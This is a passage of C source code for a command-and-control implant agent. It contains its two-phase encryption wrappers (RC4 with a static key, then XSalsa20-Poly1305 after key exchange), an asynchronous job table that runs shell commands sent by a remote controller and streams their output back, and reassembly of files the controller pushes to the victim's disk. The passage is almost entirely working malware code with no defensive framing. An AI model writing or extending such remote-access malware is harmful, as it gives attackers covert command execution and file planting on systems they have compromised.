/* ── Crypto wrappers: two-phase encryption ─────────────────────────────
 * Phase 1 (before DH): RC4 stream cipher with a static pre-shared key
 *   (g_key). Weaker but usable before the ECDH handshake completes.
 * Phase 2 (after DH): XSalsa20-Poly1305 "secretbox" with the ephemeral
 *   session key (g_session_key). Authenticated encryption — the controller
 *   can verify the message was not tampered with in transit.
 *
 * c2_enc / c2_dec / c2_dec_raw: transparent wrappers that automatically
 * pick the right cipher based on g_dh_done. The rest of the code never
 * needs to know which cipher is active. */
static size_t c2_enc(char *out, const void *plain, size_t plen){
    if(g_dh_done) return v6_enc(out, g_session_key, plain, plen);
    return v4_enc(out, g_key, plain, plen);}

static ssize_t c2_dec_raw(uint8_t *out, size_t outsz, const char *b62){
    if(g_dh_done) return v6_dec_raw(out, outsz, g_session_key, b62);
    return v4_dec_raw(out, outsz, g_key, b62);}

static ssize_t c2_dec(char *out, size_t outsz, const char *b62){
    if(g_dh_done) return v6_dec(out, outsz, g_session_key, b62);
    return v4_dec(out, outsz, g_key, b62);}

/* ── Async job tracking ─────────────────────────────────────────────────
 * Each shell command the controller sends becomes a "Job".
 * Jobs run in a child process (fork+exec), output is streamed back via a
 * pipe in 160-byte chunks (CHUNK_PAYLOAD) as they arrive.
 *
 * Why async? A synchronous design would block the agent's event loop while
 * the command runs. Async allows the agent to keep sending beacons, accept
 * new commands, and handle multiple concurrent jobs (up to MAX_JOBS=8).
 *
 * Fields:
 *   active    : 1 if this slot is in use.
 *   job_id    : incrementing counter, identifies the job in RSP packets.
 *   cmd       : the shell command string (for debug / "jobs" listing).
 *   pid       : child process PID (used to kill it on timeout or "kill:" ctl).
 *   pipe_fd   : read end of the pipe connected to child's stdout+stderr.
 *   start     : epoch when the job started (for JOB_TIMEOUT enforcement).
 *   chunk_buf : accumulation buffer; flushed as a chunk when full or at EOF.
 *   chunk_used: bytes currently in chunk_buf.
 *   seq_sent  : how many chunks have been sent (for reassembly on ctrl side). */
typedef struct {
    int      active, job_id;
    char     cmd[2048];
    pid_t    pid;
    int      pipe_fd;
    time_t   start;
    uint8_t  chunk_buf[CHUNK_PAYLOAD]; /* current partial buffer */
    size_t   chunk_used;
    uint16_t seq_sent;                 /* last seq sent */
} Job;
static Job g_jobs[MAX_JOBS];
static int g_job_seq = 0;

/* ── Pending file uploads (ctrl → agent) ───────────────────────────────
 * When the controller pushes a file to the agent (UL command), it splits
 * the file into chunks and sends them individually (may arrive out of order
 * over UDP). The agent reassembles them here before writing to disk.
 *
 *   phsh   : FNV-32 hash of the destination path — identifies which upload
 *             a chunk belongs to (multiple concurrent uploads supported).
 *   path   : destination path on the agent's filesystem.
 *   chunks : array of received chunk payloads (malloc'd, freed after write).
 *   clens  : byte length of each chunk.
 *   got    : bitmask of received chunks (1 = arrived).
 *   total  : total number of chunks expected (set on seq=1). */
typedef struct {
    uint32_t phsh;
    char     path[512];
    uint8_t *chunks[MAX_CHUNKS];
    size_t   clens[MAX_CHUNKS];
    int      got[MAX_CHUNKS];
    size_t   total;
} PendingUL;
static PendingUL ul_pending[MAX_UL_PENDING];
static int       n_ul_pending=0;

static PendingUL *get_pul(uint32_t phsh){
    for(int i=0;i<n_ul_pending;i++)
        if(ul_pending[i].phsh==phsh) return &ul_pending[i];
    if(n_ul_pending>=MAX_UL_PENDING) return NULL;
    PendingUL *p=&ul_pending[n_ul_pending++];
    memset(p,0,sizeof(*p));p->phsh=phsh;return p;}

